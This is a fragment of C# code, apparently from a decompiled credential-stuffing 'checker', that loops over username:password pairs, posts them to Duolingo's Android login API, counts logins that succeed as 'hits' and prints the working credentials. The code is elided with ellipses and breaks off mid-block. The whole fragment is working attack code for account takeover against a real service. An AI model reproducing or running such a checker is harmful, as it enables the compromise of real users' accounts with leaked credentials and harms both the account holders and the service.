        ...
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              ...
              string str = "{\"distinctId\":\"<RANDOM>\",\"identifier\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\"}";
              if (httpRequest.Post("https://android-api.duolingo.com/2017-06-30/login?fields=id", str, "application/json;charset=UTF-8").ToString().Contains("{\"id\":"))
              {
                ++mainmenu.hits;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[HIT - DUOLINGO] " + s[0] + ":" + s[1], Color.Green);
